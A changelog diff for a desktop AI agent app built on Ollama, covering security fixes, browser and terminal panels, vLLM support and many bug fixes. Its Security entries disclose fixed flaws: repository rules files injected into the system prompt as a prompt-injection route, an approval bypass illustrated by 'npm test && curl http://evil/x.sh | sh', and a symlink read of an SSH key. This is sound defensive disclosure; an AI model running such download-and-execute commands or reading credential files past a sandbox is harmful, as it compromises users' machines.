@@ -7,7 +7,522 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased]
 
+### Security
+#### Project rules from an untrusted folder no longer write the system prompt (#608)
+Opening a cloned repository was enough to let that repository author the
+agent's instructions: `AGENTS.md`/`CLAUDE.md` was read from the workspace root
+and injected into the SYSTEM message, where most models treat it as
+outranking the user. With shell, filesystem, git and browser tools in the app,
+a hostile file's payoff is full local compromise — and nothing showed the user
+what had been loaded.
+
+- **The folder must be trusted first.** A rules file found in an untrusted
+  folder raises a banner with a preview and a Trust/Not now choice; until then
+  it stays out of the prompt. The folder still opens and its git/FS tools still
+  register, so it remains usable while untrusted.
+- **Trust is keyed on the canonical folder path**, not a hash of the file.
+  Hash-keying would re-prompt on every edit to your own `AGENTS.md` — in the
+  repo you are actively developing — and an approval treadmill trains people to
+  click through without reading, which is worse than no prompt. This matches
+  VS Code, Claude Code and Cursor. The record persists: trusting a folder is a
+  durable judgment about a location, unlike the session-scoped CLI allowlists.
+- **Secure erase revokes trust** (`trusted_folders` joins `APP_STORAGE_KEYS`),
+  so a machine the user has cleaned does not silently re-trust repositories.
+
+Two fixes that apply whether or not a folder is trusted:
+- **The rules file is capped at 16k characters**, requested as a bounded read
+  rather than trimmed after the fact. An oversized file previously ate the
+  context window silently, discoverable only by running `/tokens` and
+  wondering where the budget went. The truncation is stated in the injected
+  text so the model knows its instructions were cut.
+- **The delimiter states provenance**: the block is labelled as coming from a
+  file in the opened repository, explicitly not as instructions from the user,
+  with an instruction to ignore any attempt inside it to override them. The
+  trust gate limits *when* the text is injected; this limits how much authority
+  it carries once it is.
+
+
+### Added
+#### Built-in browser and terminal panels (#623, #624, #625, #626)
+The browser and terminal open and close beside the chat, the way Claude and
+ChatGPT desktop do it. `PanelShell`, `BrowserPane` and `TerminalPanel` were all
+fully implemented but the dock was dropped from `App.tsx` in the UI
+simplification, so none of it could be reached — the feature existed only as
+dead code. It is wired up again, with the minimal-UI contract intact where it
+matters: a fresh window renders no dock chrome at all until a panel is asked
+for, via the command palette or **Ctrl/Cmd+Shift+B** (browser) and
+**Ctrl/Cmd+Shift+J** (terminal). Open panels persist across restarts.
+
+- **Network traffic is recorded and readable by the agent** (`browser_read_network`).
+  The browser could report console output but had no network visibility at all,
+  which is most of the value of driving a page: "why did the login fail" and
+  "what did the API return" are network questions. Requests, responses,
+  statuses, durations and failures are captured from `fetch` and
+  `XMLHttpRequest`, filterable by URL, method, status class (`4xx`/`5xx`) and
+  failed-only. Bodies are off by default — one JSON response can be larger than
+  the whole context window.
+- **Credentials never enter the log.** `Authorization`, `Cookie`, `Set-Cookie`
+  and API-key headers are redacted at *record* time, not on read: anything in
+  the buffer can reach the model context and from there the provider, so the
+  value must never be stored at all.
+- **Page errors have their own channel** (`browser_read_errors`): uncaught
+  exceptions and unhandled rejections, with stacks, kept apart from ordinary
+  console noise where they used to be buried.
+- The recorder reads response bodies from a **clone**, so instrumentation can
+  never consume the body the page itself is waiting for.
+- **External sites are covered too** (#628). The `fetch`/`XHR` patch only
+  reaches same-origin pages, which excluded every real site a login flow
+  targets. The Chromium engine now enables the CDP `Network` domain and pumps
+  `requestWillBeSent` / `responseReceived` / `loadingFailed` into a bounded
+  ring; `browser_read_network` merges both sources so the model never has to
+  know which surface a page is on. URLs are credential-stripped before storage
+  — a token in a query string is as sensitive as one in a header.
+- **`browser_read_console` works at all now** (#629). It had never returned
+  anything on the Chromium path: the ring existed and the tool drained it, but
+  the engine's event task was `while handler.next().await.is_some() {}` — every
+  event discarded, so nothing was ever recorded. To the model that reads as
+  "the page logged nothing" rather than "this is not wired up".
+
+
+### Added
+#### Nothing is pre-configured; providers are listed in the sidebar (#563, #566)
+A fresh install now contacts no model server at all and opens empty. The local
+Ollama daemon is added the same way as any other provider, so "no providers
+configured" is a state the UI can actually show — previously it could not,
+because a local Ollama was assumed to exist whether or not the machine ran one.
+- **Providers panel in the sidebar**, under the projects list and above
+  Settings: one compact row per provider with its type, endpoint, model count
+  and reachability, plus a per-provider Test button. Status is exposed as text,
+  not colour alone, so screen readers get it too.
+- **The header's Ollama-only status dot is gone** (#563). With several
+  providers configurable it could only ever describe one of them.
+- **The red "Ollama isn't running" banner and its 30-second auto-reconnect are
+  gone** (#562): they assumed Ollama is the only provider, so a user running
+  purely on vLLM or LM Studio saw a permanent error about a daemon they never
+  use, and paid for a request to it every 30 seconds.
+
+#### Interface language: English and Swedish (#564)
+English is the default and Swedish is selectable under Settings → Language. The
+choice persists and sets `document.documentElement.lang`, so assistive tech and
+`:lang()` follow the UI. Translations live in `src-frontend/locales/{en,sv}.ts`
+as typed modules; a parity test names any key defined in one language and not
+the other, so a forgotten translation fails the build instead of silently
+falling back to English mid-screen.
+
+#### vLLM as a first-class model provider (#552)
+A vLLM server — local or anywhere on the network — can now be added under
+Settings → Model providers, and its models join the one model list in the
+composer alongside local Ollama, cloud and LM Studio models. Verified end to
+end against a live vLLM 0.28 server (`nvidia/Qwen3.6-35B-A3B-NVFP4`).
+- **Pick "vLLM", type a host.** `gx10` is completed to `http://gx10:8000` —
+  scheme and the provider's conventional port are added when missing, and an
+  explicit port or scheme is never overridden. The same applies to the other
+  kinds (Ollama → 11434, OpenAI-compat → 1234).
+- **Models are grouped by provider** in the selector (`— vLLM: gx10 —`), so
+  with several servers connected it is clear which one a model comes from.
+- **Chat and agentic runs both route to the server the model belongs to**,
+  through the OpenAI chat-completions loop added in #551 — including tool
+  calling, which vLLM implements natively.
+
+### Security
+- **"Securely erase all local data" now erases it (#596).** It cleared only
+  localStorage, leaving every chat, project and folder in the on-disk mirror —
+  and an empty localStorage is precisely the condition that makes boot
+  hydration restore from that mirror, so the user saw "Securely erased N
+  items", relaunched, and found everything back. A new Rust `clear_store`
+  command deletes the mirror file outright (an empty mirror is still a file),
+  reached through an awaitable `clearDisk()` that first cancels any pending
+  debounced write, since one scheduled moments earlier would otherwise land
+  after the erase. Success is reported only once the disk is actually clean.
+- **Secure erase no longer leaves API keys behind (#597).** The wipe matched
+  only the `ollama_gui_` and `mcp_` prefixes, so `model_connections`,
+  `openapi_servers` and `imagegen_config` — all holding plaintext API keys —
+  survived it, along with `custom_tools`, `custom_functions`, `model_presets`,
+  `active_preset_id`, `stt_config` and `voice_settings`. Those keys are now
+  enumerated in `APP_STORAGE_KEYS` and wiped alongside the prefix pass, and
+  the Settings caption states what is actually stored locally instead of
+  claiming every secret already lives in the OS keychain.
+
+- **"Always Allow" no longer hands over a shell (#606, #609).** Approving
+  `npm test` once stored the token `npm`, after which `npm test && curl
+  http://evil/x.sh | sh` ran with no prompt — and that modal is the only
+  boundary between the model and a shell, since the Rust side passes the whole
+  line to `sh -c` unfiltered. Approvals are now two separate scopes: the exact
+  command line by default, and program scope only via its own labelled button,
+  offered only for a plain command line. Program scope additionally fails
+  closed on any shell control character (a character-class scan, not a list of
+  scary words, which is trivially rewritten around). The bare `a` shortcut
+  grants only the narrowest scope and no longer fires from a text field or
+  with Shift held. The modal text now matches what is actually remembered — it
+  previously claimed "this exact command" for a control that did the opposite.
+  Browser approvals, which reuse the same modal, no longer write the junk
+  token `Browser` into the CLI allowlist.
+- **The agent can no longer read outside the workspace through a symlink
+  (#607).** The sandbox check normalised `..` lexically but never resolved
+  symlinks, while `std::fs` follows them: with a `link -> $HOME` in the
+  workspace, `read_file("link/.ssh/id_rsa")` passed the check and returned the
+  key — unprompted at every autonomy level, since `read_file` is read-only.
+  Such links occur routinely in cloned repos and node_modules link farms, so
+  no planted file was required. Paths are now canonicalised as far as they
+  exist (new files still resolve) and refused only when the target leaves
+  every root, so legitimate internal links keep working. The same fix removes
+  a class of false rejections where a path arriving through a symlinked
+  ancestor (macOS `/tmp` → `/private/tmp`) was wrongly refused.
+- **`requestCliApproval` fails closed.** It returned `true` when no approval
+  UI was registered; a gate whose absence means "allow" is the wrong default.
+  Tests opt in explicitly.
+- **Corrected the misleading Rust security docs.** `CLI_DENYLIST` (`sudo`,
+  `rm`, …) is unreachable from the UI, so a reader reasonably concluded those
+  commands were blocked for the agent. The comment now says plainly that it is
+  not a boundary, and why re-pointing `run_shell_command` at it is not
+  actionable (it spawns without a shell and cannot run the pipes and `&&` the
+  agentic loop depends on).
+
+### Fixed
+- **`/save` → `/load` and `/export json` → Import work again (#598).** Both
+  writers emit a single session object while the only reader demanded an
+  array, so every snapshot failed with "Expected an array of sessions" — at
+  restore time, exactly when the user was relying on it. Fixed in the reader,
+  which also rescues every file already written; a writer-only fix would have
+  stranded them permanently while appearing to work.
+- **Max tokens, stop sequences and top_p now reach OpenAI-compatible servers
+  (#568).** An LM Studio or vLLM user could set max tokens and a stop
+  sequence, have `/params` confirm both, and never have either sent — replies
+  ran to the server default and never stopped early. Our Ollama-shaped options
+  are now mapped to OpenAI names on all three call sites (chat, agent loop,
+  Continue generation). The mapping is deliberate rather than a spread:
+  `num_predict` becomes `max_tokens` and its `-1` "unlimited" sentinel is
+  dropped (OpenAI cannot express it), an empty `stop` array is dropped (`/stop
+  clear` leaves one, and posting it 400s some servers), `num_ctx` is never
+  sent (it has no wire equivalent — it stays the client-side budget driving
+  compaction and the context meter), and `top_k` goes only to vLLM or a
+  keyless local server, since a strict gateway rejects it outright.
+- **Stop now stops, mid tool-batch (#577).** A turn that queued several tools
+  ran every one of them to completion after the user pressed Stop. Under
+  `auto` autonomy nothing gates those calls, so files kept being written and
+  shell commands kept firing while the UI said the run had stopped. The Ollama
+  loop now checks the abort signal before each queued call, as the OpenAI loop
+  always has.
+- **Parallel tool calls in one Ollama turn are no longer dropped (#620).** The
+  dedup key interpolated `arguments` into a template string, but Ollama sends
+  them as an object — so `read_file(a)`, `read_file(b)`, `read_file(c)` all
+  keyed to `[object Object]` and only the first ran, with the model answering
+  as if it had seen all three. Found while writing the #577 regression test,
+  which passed against the unfixed code precisely because of this.
+- **Cancelling an agent run on LM Studio / vLLM no longer freezes the UI
+  (#578).** The OpenAI loop returned early on cancel and skipped its terminal
+  callback — and that callback is the only place the app clears its loading
+  state, so pressing Esc left the composer disabled and the spinner turning
+  until the user also hit Stop. Every exit path now fires exactly one terminal
+  callback, and a cancel on the final iteration is no longer misreported as
+  hitting the iteration limit.
+- **A stopped run is no longer reported as finished (#591).** Interrupting a
+  run that had made tool calls appended a green "✅ Done in 14s — 3 steps"
+  card, a "Run finished" banner, a desktop notification and a success chime.
+  It now says "Run stopped after …", keeps the stats (after a Stop, what was
+  already done to the working tree is what matters), and stays silent. The
+  cancel is detected from the abort signal, which covers Escape too — Escape
+  never enters `cancelStream`, so a flag set there would have missed it.
+- **CI is green again: the `cargo audit` gate no longer fails on RUSTSEC-2026-0258.**
+  `reqwest` 0.11 pulled `hyper` 0.14 and with it the vulnerable `h2` 0.3.27
+  ("unbounded empty DATA frames"). Upgraded to reqwest 0.13 — the version
+  `chromiumoxide` already depends on — so `h2` is now 0.4.19 and the two share
+  one copy instead of duplicating the stack.
+- **A missing image no longer hides the whole app.** The boot-failure reporter
+  registered its listener in the capture phase, which also catches *resource*
+  load failures (an icon, a lazy chunk). Those carry no `.message`, so a 404
+  rendered a full-screen "Ollama GUI could not start — Unknown error" over a
+  UI that was working perfectly. It now ignores anything whose event target is
+  an element, stays silent once React has mounted, and clears its no-render
+  timer on mount. Verified in a real browser both ways: a genuine parse error
+  is still reported, a 404 and a late promise rejection are not (#552).
+- **The boot reporter no longer risks breaking styling in the packaged app.**
+  Its markup and `<style>` block are built from script instead. A static
+  `<style>` would make Tauri add a nonce to `style-src`, and per CSP3 a nonce
+  makes the policy's `'unsafe-inline'` be ignored — which would have broken
+  every stylesheet the app injects at runtime, mermaid's most visibly (#552).
+- **`normalizeBaseUrl` no longer breaks a URL the user wrote in full.** It
+  forced the provider's default port onto any `http://` URL, so an endpoint
+  behind nginx or a tunnel on port 80 became unreachable and could not be
+  expressed at all — `parsed.port` reads empty for a scheme's default port, so
+  an explicit `:80` was indistinguishable from no port. A bare host is still
+  completed; a URL written with its scheme is now taken as given. A trailing
+  `/v1` is also dropped for OpenAI-dialect providers, whose callers append
+  their own — pasting the URL vLLM's and LM Studio's docs print produced
+  `/v1/v1/models` and a 404 shown only as "could not fetch models" (#552).
+- **Agent routing and capability probing no longer race the provider fetch.**
+  Both resolved through `connectedModels`, which arrives asynchronously, so on
+  the first renders after a reload a saved vLLM/LM Studio model looked local:
+  a send in that window went to the local Ollama daemon under a name it has
+  never heard of. Both now resolve against the synchronously-loaded connection
+  list. Model capabilities are also keyed by endpoint as well as name, so two
+  servers offering the same tag no longer share one cache entry, and a
+  token-protected remote Ollama is probed with its bearer token (#552).
+- **vLLM reasoning models no longer look silent.** vLLM streams its
+  scratchpad in a `reasoning` delta field; we read only `reasoning_content`
+  and `thinking`, so every reasoning token was discarded and the bubble
+  stayed empty until the final answer landed. All three field names are now
+  read, in both plain chat and the agent loop (#552).
+- **The app no longer renders a blank white window on older macOS (#552).**
+  The boot bundle contained RegExp lookbehind — one from our own
+  `projectNaming.ts`, one from `remark-gfm` — which is an ECMAScript *Early
+  Error* on WebKit below 16.4: the whole bundle fails to parse, nothing
+  executes, and the page stays empty. The React error boundary could not
+  report it, since it lives inside the module graph that failed to load.
+  Ours is gone; the dependency's sets an honest floor, now declared rather
+  than discovered:
+  - `vite.config.ts` pins `build.target` instead of inheriting Vite's moving
+    `baseline-widely-available` default, so a Vite upgrade can no longer
+    raise the browser floor with no diff to review.
+  - `tauri.conf.json` sets `minimumSystemVersion: 13.3`, so a Mac that
+    cannot run the app declines to launch it rather than showing a white
+    window.
+  - `index.html` carries a dependency-free boot reporter: any pre-React
+    failure — parse error, throw, or a render that silently never happens —
+    now paints a readable message instead of nothing at all.
+- **Model metadata is no longer probed on the wrong server.** Selecting a
+  model from an OpenAI-compatible provider fired `POST /api/show` at the
+  *local* Ollama daemon for a model name it has never heard of, 404-ing on
+  every model switch; a remote Ollama connection was probed at localhost
+  too. Capabilities now resolve against the model's own connection, matched
+  synchronously so a reload cannot race the provider fetch (#552).
+
+#### Qwen coder models work agentically over LM Studio (#551)
+Selecting a Qwen coder model from an OpenAI-compatible connection (LM Studio,
+llama.cpp server, vLLM) used to produce an agent that never called a tool. The
+Ollama loop speaks Ollama's `/api/chat` protocol; pointed at those servers it
+silently loses tool calling. Agentic runs on `kind: 'openai'` connections now
+go through a dedicated OpenAI chat-completions loop
+(`services/openaiAgent.ts`), verified end to end against LM Studio with
+`qwen/qwen3-coder-next`:
+- **Streamed tool calls are reassembled from fragments** — id and name arrive
+  once, arguments as many string slices, keyed by `index` until
+  `finish_reason: "tool_calls"`.
+- **Tool results round-trip with `tool_call_id`**, which strict servers
+  (LM Studio, vLLM) require to pair a result with its call.
+- **Qwen's content-channel tool calls are recovered**
+  (`services/qwenDialect.ts`). LM Studio serves Qwen3-Coder with the model's
+  own chat template, which emits calls as XML in `content` and — in streaming
+  mode — does not re-parse them back into `delta.tool_calls`
+  (lmstudio-bug-tracker#1071). Both wire dialects are parsed
+  (`<function=…>/<parameter=…>` and the older JSON-in-`<tool_call>` form),
+  with argument values coerced to their declared JSON-schema types so a
+  numeric argument does not reach the tool as a string. Recovery only runs
+  when the server produced no native calls, and only for tools that were
+  actually offered — a model *describing* a `<tool_call>` block never gets it
+  executed.
+- **`tool_calls: []` is treated as an ordinary chat turn.** LM Studio attaches
+  an empty array to every response; reading that as "a tool is coming" is what
+  hangs other clients (opencode#4255).
+- **The same autonomy gates as the Ollama loop** — tool filter, read-only
+  mode, approval prompts, pre/post hooks, output truncation, in-loop
+  compaction — run in the same order on both protocols.
+
+### Fixed
+- **Qwen reasoning no longer renders as the answer** in non-agentic chat over
+  OpenAI-compatible connections: these builds emit their scratchpad inline as
+  `<think>…</think>` in `content` rather than in `reasoning_content`, so it
+  landed in the chat bubble. It is now split onto the reasoning channel,
+  chunk-boundary safe, with a trailing partial tag flushed rather than
+  swallowed at stream end (#551).
+- **"Continue generation" works for OpenAI-compatible models**: it always sent
+  the continuation to the *local* Ollama daemon under a model name that daemon
+  has never heard of, so continuing an LM Studio reply always failed. It now
+  routes through the model's own connection (#551).
+- **A failing tool no longer kills an agentic run** on OpenAI-compatible
+  connections: a hallucinated tool name or a throwing tool is reported back to
+  the model as a tool result so it can correct itself, matching the Ollama
+  loop's behaviour. Local models get names wrong often enough that aborting
+  read as "the model is broken" (#551).
+- **Malformed tool-call arguments are named rather than swallowed**: argument
+  JSON truncated at the token limit (routine on llama.cpp) used to fall back
+  to `{}`, so the tool ran with no arguments and the model got a baffling
+  result instead of "your JSON was invalid, re-issue the call" (#551).
+- **Sub-agents follow the model you actually selected.** `spawn_subagent` and
+  `spawn_parallel_subagents` were registered once at boot in a `[]` effect, so
+  their closure captured the *startup* model and the local Ollama endpoint —
+  they ignored every later model change, and failed outright for LM Studio
+  models whose names the local daemon has never heard of. Routing now comes
+  from a live ref, and one `resolveAgentRouting` helper serves the send path,
+  the continuation path, and sub-agents so they cannot drift apart (#551).
+- **Inline code renders inline again**: react-markdown v10 stopped passing the
+  `inline` prop, so single-backtick code inside a sentence rendered as a full
+  code block with copy-button chrome. Block detection now uses the language
+  class / newline heuristic; inline code is a plain styled `<code>`.
+- **Code blocks keep their state across re-renders**: the markdown renderer
+  map is memoized, so CodeBlock no longer remounts (losing copied/expanded
+  state and re-highlighting) every time the app re-renders mid-stream.
+
+### Added
+#### Durable Rust-backed chat persistence
+- Sessions, projects, and folders are now mirrored to disk by the Rust
+  backend (`persist_store`/`load_store`, atomic temp-file+rename writes,
+  path-traversal-safe keys) on every save, debounced per key. On boot the
+  app restores them from disk when localStorage is empty — chats survive
+  localStorage eviction, clears, and quota exhaustion (a full localStorage
+  still shows the quota banner, but the messages land on disk regardless).
+
+#### Per-session working directories, MCP spec compliance, Rust path validation (#550)
+- **Per-session working directory**: every chat session remembers the folder
+  its agent works in. Opening a session from the project tree loads its
+  history AND switches the workspace to that session's folder; the folder
+  chip under the project name is clickable to change it (persisted on the
+  session). An unreachable folder (moved, renamed, unmounted volume) shows a
+  persistent warning banner with a "Choose folder…" picker — the app warns,
+  it never crashes.
+- **Rust-side path validation**: a new `path_exists` Tauri command
+  (std::fs metadata, with Rust unit tests) proactively validates working
+  folders before the workspace opens, producing precise warnings ("does not
+  exist", "is not a folder") instead of backend rejections.
+- **MCP client follows the 2025-06-18 spec** (sections cited in code):
+  proper initialize handshake with protocol-version negotiation and
+  `notifications/initialized`; Streamable HTTP transport with
+  `MCP-Protocol-Version` and `Mcp-Session-Id` headers, SSE response parsing,
+  and session re-initialization on 404; `tools/list` cursor pagination;
+  `tools/call` `isError` results surfaced as tool errors (not transport
+  failures); JSON-RPC error objects passed through typed. Non-compliant
+  servers now fail cleanly at connect instead of half-working. Also fixes a
+  stdio polling loop that could spin as a microtask chain and exhaust memory.
+- **MCP OAuth badge persists** (#521): `authenticated` is derived from the
+  token store on every server-list refresh instead of living in transient
+  React state that any add/delete/restart wiped.
+- CI vitest retries moved from vite.config.ts to the CI command line
+  (`--retry=2`): the env-conditional config entry wedged local fork-worker
+  startup on macOS.
+
 ### Changed
+#### Settings deletion pass (#549 audit rank 15)
+- **Voice Call overlay deleted**: the overlay had no way to open since the
+  header button was removed; its states, ref, and imports are gone
+  (`services/voiceCall.ts` and its tests remain for the service layer).
+- **Prompt Library dropped, data migrated**: the Settings section, App state
+  and WelcomeScreen custom-starter branch are deleted. On first boot after
+  the update, every saved prompt becomes a user slash command (slugified
+  name, description "migrated prompt", body as template) and the old store
+  is cleared — user data survives as `/commands`.
+- **Browser Scenarios section deleted** from Settings along with its five App
+  states (`services/scenario.ts` + tests remain).
+- **"Remote Ollama Servers" + "Connections" merged into one "Model
+  providers" section**: both edited the same connections store. The full
+  editor (kind Ollama/OpenAI-compat, test, edit, on/off, remove) remains and
+  the API key field now applies to both kinds, covering remote-Ollama bearer
+  tokens; the redundant second listing and quick-add form are gone.
+- **Expert builders collapsed under "Advanced"**: Custom Tools & Functions,
+  Create Model (Modelfile), OpenAPI Tool Servers, Image Generation,
+  Speech-to-Text (Whisper) and Secret Store now sit unchanged inside one
+  closed `<details>` group at the end of Settings.
+- **Secure wipe moved to the very bottom** of the modal and now requires
+  typing `ERASE` (window.prompt) instead of a one-click confirm().
+- Fixed the unbalanced `space-y-6` wrapper: every Settings section now sits
+  inside one consistent container. Dead `toggleStarModel` helper removed
+  (the ★ Starred optgroup still reads `starredModels` from localStorage).
+
+#### Project management on the project & a readable agent transcript (#549 audit ranks 12, 14)
+- **Folders live on the project now**: creating a project accepts multiple
+  folders in one OS dialog; the project row's right-click menu gained
+  Add folder…, Remove folder…, Instructions…, and Set default model; adding
+  or removing folders on the active project re-syncs the workspace + git
+  tools immediately. The Settings "Projects" section is deleted — project
+  config happens where the project is.
+- **Step-row transcript**: tool calls render as one quiet "→ name argument"
+  line (humanized top argument instead of raw JSON) and each tool result is
+  a collapsed "✓ name — click to inspect" row, so a 30-call run reads as a
+  step list instead of 60 full-height bubbles. Failed steps show ✗.
+
+#### Run trust, model steering & endurance (#549 audit ranks 9, 11, 13)
+- **End-of-run summary**: a finished agentic run appends a quiet ✅ card —
+  duration, steps, files edited, commits, check verdict — built from data the
+  callbacks were already computing (commit hashes and verify results were
+  previously discarded). Completion notification + sound now fire for agentic
+  runs too, and the tool trail is persisted as it happens so errors and
+  reloads no longer lose the record of what the agent did. The max-iterations
+  stop message gained a plain-language second sentence.
+- **Model steering**: the startup default prefers an installed local MLX
+  model; an "⚠ no tool support" chip appears beside the switcher when the
+  selected model can't run agent tools; the raw `does not support tools` 400
+  now maps to a plain-language error with a next step.
+- **Always-on compaction, sized to the window**: the Auto-compact toggle and
+  fixed 3,000-token threshold are gone. Compaction triggers at ~70% of the
+  effective context window, both before a send and — new — inside the agent
+  loop between iterations, where overflow actually happens. The old
+  "Context Compaction" Settings section became a minimal "General" section.
+
+#### First-run, trust & project management fixes (#549 audit ranks 4-6, 8, 10)
+- **Zero-models first run**: when connected with no models installed, the
+  welcome screen offers the curated one-click download list (with RAM-fit
+  notes and inline pull progress) instead of a disabled dropdown option
+  telling the user to run `ollama pull` in a terminal.
+- **Connection self-heals**: while disconnected, the 30-second poll retries
+  the connection, and a banner above the composer says what to do with a
+  one-click Retry. Error copy leads with GUI actions, not terminal commands.
+- **One folder concept**: the welcome CTA now creates a project (same path as
+  the sidebar "+"), is hidden once a project is active, and a cancelled or
+  broken folder picker shows a status banner instead of doing nothing.
+  Starter prompts are goal-shaped when a project is active.
+- **Sub-agent approval deadlock fixed**: approval requests are serialized (one
+  modal at a time; queued gates resolve in order) and sub-agent streams get
+  the parent run's AbortSignal, so Stop always unwinds a waiting run.
+- **Projects are renamable**: double-click a project row (or right-click →
+  Rename) for inline rename; project rows also gained a context menu with
+  New chat and Delete.
+
+#### Autonomy by default — create a project, state the goal, let it run (#549)
+- **Agentic mode is derived, not a setting**: tools are on exactly when the
+  active project has a bound folder; plain chat otherwise. The Settings
+  "Agentic Mode" toggle and the whole "Agent Safety" section are deleted; the
+  one visible control is a Plan / Ask / Auto selector beside the model
+  switcher, shown only while a project makes the agent active. The composer
+  placeholder becomes "Describe the goal for this session…" in agentic mode.
+- **Approvals honor the autonomy level**: read-only tools never prompt at any
+  level (the smartApprove toggle is gone); in `auto`, diff review is skipped
+  and edits apply immediately (revertible via auto-commit); in `ask`, the diff
+  modal alone gates edit tools (no duplicate generic modal); "Always allow"
+  for shell commands now allowlists the binary (first token) instead of the
+  exact command line; `run_tests`/`run_checks` command overrides go through
+  the same approval policy; plan mode with no published plan falls back to the
+  per-tool approval modal.
+- **Context auto-sizing**: `num_ctx` unset now means auto — the model's native
+  context window (read from `/api/show`, cached) capped by a RAM budget, with
+  agentic runs getting the larger window. The fixed 4096 default that silently
+  truncated agent runs is gone; the 80%-full banner gained one-click
+  "Summarize older messages" / "Raise limit" actions; agentic requests now
+  send a core toolset (+ MCP + custom tools) instead of every registration.
+- **Auto-commit and auto-verify default ON** (explicit off still respected);
+  their Settings toggles are removed.
+- **Active project persists** across restarts (`ollama_gui_active_project`),
+  so returning users keep their folder context.
+
+#### UI simplification — white minimal Ollama-style layout (#549)
+- **Look**: copies the official Ollama macOS app — white, minimal, light theme
+  by default (`DEFAULT_THEME.mode: 'light'`). Dark mode still available via
+  Settings → Appearance, the palette, or Ctrl+Shift+D.
+- **Project-first sidebar**: "+ New" opens a project picker (the user chooses
+  which project the chat belongs to); clicking a project name expands its chat
+  sessions nested beneath it; a hover "+" on each project row starts a chat in
+  that project; unscoped chats sit under a separate "Chats" group. Sort
+  selector, folder chips, tags, archived toggle, and bulk select are gone from
+  the rail (session power actions live in the right-click menu; export/import
+  moved to the command palette).
+- **Header**: reduced to a connection dot, the session title, and the agent
+  status pill. No buttons on the right. The right/bottom dock (files, browser,
+  terminal, artifacts, git, checkpoints, code search, agent activity panels) no
+  longer renders; panel keyboard shortcuts and palette entries were removed.
+- **One chat window**: the many-models side-by-side compare (#126) is removed,
+  including `services/manyModels.ts`, its send-path branch, and the picker.
+- **Model switcher below the composer** (#544): the model `<select>` moved from
+  the header to directly below the chat input; local MLX models stay grouped
+  first and bold, with an "⚡ MLX" badge shown while an MLX model is selected.
+- **Messages**: user turns render as quiet gray bubbles, assistant turns as
+  plain text on white; the per-message role/timestamp/token header row is gone;
+  hover actions trimmed to Copy / Regenerate / Edit / Delete (everything else
+  remains in the message right-click menu).
+- **MLX simplified**: the layered MLX settings (full inference / embeddings /
+  detect / cloud-brain-local-worker) and the separate `mlx_lm.server`
+  lifecycle are removed (`services/orchestrator.ts` deleted; `services/mlx.ts`
+  reduced to availability detection + `isMlxModelName`). MLX acceleration is
+  now implicit: selecting a local `-mlx` model on a capable machine is all it
+  takes — Ollama serves MLX weights natively.
+
 #### Platform: bring the feature line to `master`/`development` targeting newer macOS + Linux + Windows (#216)
 - **Branching model**: the full feature set (M29–M173) previously developed on
   the `macOS-10.15` branch is consolidated onto `master`, with ongoing work on a
